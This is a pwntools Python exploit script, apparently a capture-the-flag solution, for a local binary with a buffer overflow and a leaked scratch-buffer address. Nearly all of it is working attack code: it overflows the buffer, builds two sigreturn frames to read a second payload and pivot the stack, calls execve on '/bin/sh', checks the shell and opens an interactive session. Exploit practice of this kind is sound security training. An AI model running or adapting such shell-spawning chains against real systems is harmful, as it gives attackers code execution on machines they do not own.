#!/usr/bin/env python3


from pwn import *

context.log_level = 'info'
context.arch = 'amd64'
binary = './main'
elf = ELF(binary)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(args.HOST or 'localhost', args.PORT or 9004, *a, **kw)
    else:
        return process([binary] + argv, *a, **kw)

gdbscript = '''
b *listen+45
continue
'''

# Gadget addresses (will be found dynamically in script)
pop_rax = 0
syscall_ret = 0

def solve():
    global pop_rax, syscall_ret
    
    # 1. Find Gadgets
    # Since we built it with symbols, we can look them up, 
    # but for robustness let's verify.
    try:
        pop_rax = elf.symbols['gadget_pop_rax']
        syscall_ret = elf.symbols['gadget_syscall']
    except:
        # Fallback manual scan if symbols missing
        rop = ROP(elf)
        pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
        # syscall; ret is rare in ROPgadget default search sometimes
        # let's assume challenge provides it if symbols fail
        pass
        
    log.info(f"pop rax; ret @ {hex(pop_rax)}")
    log.info(f"syscall; ret @ {hex(syscall_ret)}")

    io = start()
    
    # 2. Get Scratch Buffer Leak
    io.recvuntil(b'guide your signal: ')
    scratch_addr = int(io.recvline().strip(), 16)
    log.success(f"Scratch Buffer Leaked @ {hex(scratch_addr)}")
    
    io.recvuntil(b'Speak signal:\n')
    
    # DEBUG: Find offset with cyclic pattern
    '''
    io.send(cyclic(200))
    io.wait()
    core = io.corefile
    offset = cyclic_find(core.fault_addr)
    log.info(f"Offset found: {offset}")
    return
    '''
    # Start with common dynamic linking offset assumption (usually 40 or 72)
    offset = 40 
    
    
    
    pivot_addr = scratch_addr + 0x100
    
    # Payload 1
    p1 = b'A' * offset
    p1 += p64(pop_rax)
    p1 += p64(15)           # RAX = 15 (sys_tr_sigreturn)
    p1 += p64(syscall_ret)  # syscall
    
    frame1 = SigreturnFrame()
    frame1.rax = 0              # sys_read
    frame1.rdi = 0              # fd = 0 (stdin)
    frame1.rsi = scratch_addr   # buf = scratch
    frame1.rdx = 0x500          # count
    frame1.rip = syscall_ret    # execute syscall
    frame1.rsp = pivot_addr     # NEW STACK POINTER
    
    p1 += bytes(frame1)
    
    io.send(p1)
    time.sleep(0.2)
    

    p2 = b'/bin/sh\x00'              # at scratch_addr
    
    # Pad until pivot_addr (0x100 bytes from start)
    # current length is 8.
    p2 += b'\x90' * (0x100 - len(p2))
    
    # NOW WE ARE AT `pivot_addr` (RSP points here after read returns)
    # The `ret` of the `syscall; ret` gadget will pop from here!
    
    # We need to set RAX=59, RDI=binsh, etc. using SIGROP
    p2 += p64(pop_rax)
    p2 += p64(15)
    p2 += p64(syscall_ret)
    
    frame2 = SigreturnFrame()
    frame2.rax = 59             # sys_execve
    frame2.rdi = scratch_addr   # points to "/bin/sh"
    frame2.rsi = 0
    frame2.rdx = 0
    frame2.rip = syscall_ret
    frame2.rsp = pivot_addr + 0x400 # Just somewhere writable/safe
    
    p2 += bytes(frame2)
    
    io.send(p2)
    time.sleep(0.5)
    
    # Check shell
    io.sendline(b'echo SHELL_ACTIVE')
    try:
        if b'SHELL_ACTIVE' in io.recv(timeout=1):
            log.success("Shell verified!")
        else:
            log.warning("Exploit sent but no echo...")
    except:
        log.warning("Exploit sent but no response.")
        
    io.interactive()

if __name__ == '__main__':
    solve()
